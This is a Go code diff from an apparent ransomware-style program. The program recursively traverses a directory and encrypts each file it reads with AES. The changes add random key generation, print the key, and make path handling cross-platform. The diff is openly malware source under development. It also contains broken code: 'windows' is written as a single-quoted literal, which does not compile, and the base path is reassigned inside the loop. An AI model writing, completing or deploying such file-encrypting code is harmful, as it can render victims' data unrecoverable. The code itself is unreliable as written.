@@ -24,11 +24,6 @@ func main() {
 		fmt.Println("ERROR: ", err)
 		os.Exit(1)
 	}
-	opSystem = runtime.GOOS
-
-	if opSystem == "windows" {
-		traverseFiles(files, testdir)
-	}
 }
 
 func dirRecurse(dirname os.DirEntry, base string) {
@@ -41,14 +36,20 @@ func dirRecurse(dirname os.DirEntry, base string) {
 }
 
 func traverseFiles(files []os.DirEntry, base string) {
+	opSystem = runtime.GOOS
+	fileSep := "/"
+	if opSystem == 'windows' {
+		fileSep = "\\"
+	}
 	for _, file := range files {
 		if file.IsDir() {
-			fmt.Println("traverseFiles read dir path: ", base+"\\"+file.Name())
-			base = base + "\\" + file.Name()
+			//fmt.Println("traverseFiles read dir path: ", base+"\\"+file.Name())
+			fmt.Println("traverseFiles read dir path: ", base + fileSep + file.Name())
+			base = base + fileSep + file.Name()
 			dirRecurse(file, base)
 		} else {
-			fmt.Println("traverseFiles read file path: ", base+"\\"+file.Name())
-			path := base + "\\" + file.Name()
+			fmt.Println("traverseFiles read file path: ", base + fileSep + file.Name())
+			path := base + fileSep + file.Name()
 			data, err := os.ReadFile(path)
 			if err != nil {
 				fmt.Println(err)
@@ -65,7 +66,14 @@ func encryptFile(file []byte, path string) {
 	fmt.Println("path ", path)
 
 	key := make([]byte, 32)
+	_, err := rand.Read(key)
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
+
 	fmt.Println("key ", key)
+	fmt.Printf("%x", key)
 
 	c, err := aes.NewCipher(key)
 	if err != nil {
